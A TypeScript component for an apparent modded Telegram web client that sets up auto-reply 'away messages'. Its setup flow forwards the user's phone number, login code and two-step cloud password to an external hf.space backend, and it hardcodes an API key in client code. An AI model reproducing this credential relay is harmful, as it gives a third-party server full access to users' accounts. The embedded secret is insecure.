import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';
import useLang from '../../../hooks/useLang';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import Checkbox from '../../ui/Checkbox';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; 
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ onReset, currentUserId, currentUserPhone }) => {
  const lang = useLang();
  const safeUserId = currentUserId || "unknown";

  const [isLinked, setIsLinked] = useState(() => localStorage.getItem(`ar_linked_${safeUserId}`) === 'true');
  const [isEnabled, setIsEnabled] = useState(() => localStorage.getItem(`ar_enabled_${safeUserId}`) === 'true');
  const [replyText, setReplyText] = useState(() => localStorage.getItem(`ar_text_${safeUserId}`) || "I am currently unavailable. I will reply to you later.");
  
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  
  const [savedPhone, setSavedPhone] = useState(() => localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '');
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    setErrorMsg('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) {
        setErrorMsg("Phone number not found for this account.");
        return;
    }
    setErrorMsg('');
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      const data = await res.json();
      
      if (res.ok) {
        setStep('otp');
        setSavedPhone(formattedPhone);
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        setErrorMsg(data.error || "Failed to request code.");
      }
    } catch (err) { 
        setErrorMsg("Network Error: Could not connect to the server."); 
    }
    setIsLoading(false);
  };

  const handleVerifyCode = async () => {
    if (!otpCode && step === 'otp') {
        setErrorMsg("Please enter the OTP code.");
        return;
    }
    setErrorMsg('');
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({
          user_id: safeUserId,
          phone_number: savedPhone,
          otp_code: otpCode,
          two_step_password: twoFaPassword || undefined
        })
      });
      const data = await res.json();
      
      if (res.ok) {
        handleCancelSetup();
        setIsLinked(true);
        setIsEnabled(true);
        localStorage.setItem(`ar_linked_${safeUserId}`, 'true');
        localStorage.setItem(`ar_enabled_${safeUserId}`, 'true');
        localStorage.setItem(`ar_text_${safeUserId}`, replyText);
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
        localStorage.setItem(`ar_setup_step_${safeUserId}`, '2fa');
      } else if (res.status === 400 && data.error.includes("expired")) {
        setErrorMsg("Code expired. Please request a new one.");
        handleCancelSetup();
      } else {
        setErrorMsg(data.error || "Verification failed.");
      }
    } catch (err) { 
        setErrorMsg("Network Error: Could not verify code."); 
    }
    setIsLoading(false);
  };

  const handleSaveSettings = async () => {
    setIsLoading(true);
    setErrorMsg('');
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      if (res.ok) {
        localStorage.setItem(`ar_enabled_${safeUserId}`, isEnabled.toString());
        localStorage.setItem(`ar_text_${safeUserId}`, replyText);
        // Optional: Show a subtle toast notification here if you have a toast system
      } else {
        if (res.status === 400) {
            setIsLinked(false);
            localStorage.setItem(`ar_linked_${safeUserId}`, 'false');
        }
        setErrorMsg("Failed to update settings. Session might be disconnected.");
      }
    } catch (err) { 
        setErrorMsg("Network Error: Could not save settings."); 
    }
    setIsLoading(false);
  };

  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <Button round color="translucent" size="smaller" ariaLabel={lang('Back')} onClick={onReset}>
          <i className="icon-arrow-left" />
        </Button>
        <h3 className="settings-header-title">Away Messages</h3>
      </div>

      <div className="settings-main-menu">
          {!isLinked ? (
            <div className="settings-item pt-3 pb-3">
              {errorMsg && <p className="error" style={{ color: 'var(--color-error)', fontSize: '14px', marginBottom: '1rem' }}>{errorMsg}</p>}
              
              {step === 'idle' && (
                <>
                  <h4 className="settings-item-header">Connect Server</h4>
                  <p className="settings-item-description" style={{ marginBottom: '1.5rem', color: 'var(--color-text-secondary)' }}>
                    Connect your account to enable away messages. A login code will be sent to your Telegram app.
                  </p>
                  <Button onClick={handleAutoRequestCode} isLoading={isLoading} fluid>
                    Request Login Code
                  </Button>
                </>
              )}

              {step === 'otp' && (
                <>
                  <h4 className="settings-item-header">Verification Code</h4>
                  <p className="settings-item-description" style={{ marginBottom: '1.5rem', color: 'var(--color-text-secondary)' }}>
                    Enter the code sent to your Telegram app. You can safely leave this screen to check your messages.
                  </p>
                  <InputText label="Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />
                  <div style={{ display: 'flex', gap: '10px', marginTop: '1.5rem' }}>
                      <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} fluid>Cancel</Button>
                      <Button onClick={handleVerifyCode} isLoading={isLoading} fluid>Verify</Button>
                  </div>
                </>
              )}

              {step === '2fa' && (
                <>
                  <h4 className="settings-item-header">Two-Step Verification</h4>
                  <p className="settings-item-description" style={{ marginBottom: '1.5rem', color: 'var(--color-text-secondary)' }}>
                    Your account is protected with an additional password.
                  </p>
                  <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />
                  <div style={{ display: 'flex', gap: '10px', marginTop: '1.5rem' }}>
                      <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} fluid>Cancel</Button>
                      <Button onClick={handleVerifyCode} isLoading={isLoading} fluid>Submit</Button>
                  </div>
                </>
              )}
            </div>
          ) : (
            <>
              <div className="settings-item">
                <Checkbox
                  checked={isEnabled}
                  onChange={(checked) => setIsEnabled(checked)}
                  label="Enable Away Messages"
                />
                <p className="settings-item-description" style={{ marginTop: '0.5rem', color: 'var(--color-text-secondary)', fontSize: '14px' }}>
                  Automatically reply to incoming private messages when you are away.
                </p>
              </div>

              <div className="settings-item pt-3">
                <h4 className="settings-item-header mb-2">Message</h4>
                <InputText
                  value={replyText}
                  onChange={(e: any) => setReplyText(e.target.value)}
                  disabled={!isEnabled}
                  multiline
                  rows={4}
                />
              </div>

              {errorMsg && <div className="settings-item"><p style={{ color: 'var(--color-error)', fontSize: '14px' }}>{errorMsg}</p></div>}

              <div className="settings-item pt-3">
                <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>
                  Save Settings
                </Button>
              </div>
            </>
          )}
      </div>
    </div>
  );
};

export default memo(withGlobal<OwnProps>(
  (global): StateProps => { 
      const currentUserId = global.currentUserId;
      let currentUserPhone = undefined;
      
      if (currentUserId && global.users && global.users.byId) {
          const user = global.users.byId[currentUserId];
          if (user && user.phoneNumber) {
              currentUserPhone = user.phoneNumber;
          }
      }

      return { currentUserId, currentUserPhone }; 
  }
)(AutoReplySettings));
